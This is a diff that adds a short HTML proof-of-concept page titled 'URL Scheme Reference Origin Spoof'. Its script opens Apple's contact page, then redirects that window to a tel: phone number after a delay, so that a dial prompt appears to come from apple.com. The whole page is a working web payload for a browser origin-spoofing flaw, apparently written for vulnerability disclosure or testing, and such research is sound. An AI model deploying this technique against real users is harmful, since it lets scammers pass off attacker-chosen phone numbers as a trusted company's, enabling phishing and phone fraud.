@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>URL Scheme Reference Origin Spoof</title>
+    </head>
+    <body>
+        <u><a id="contact" onclick="contactSite()">Contact Apple</a></u>
+        <script type="text/javascript">
+            function contactSite() {
+                var x = window.open("https://www.apple.com/contact");
+                setTimeout(function() {
+                    x.location.href = "tel:+123456789";
+                }, 1500);
+                setTimeout(function() {
+                    location.href = "https://www.apple.com/contact";
+                }, 1500);
+            }
+        </script>
+    </body>
+</html>
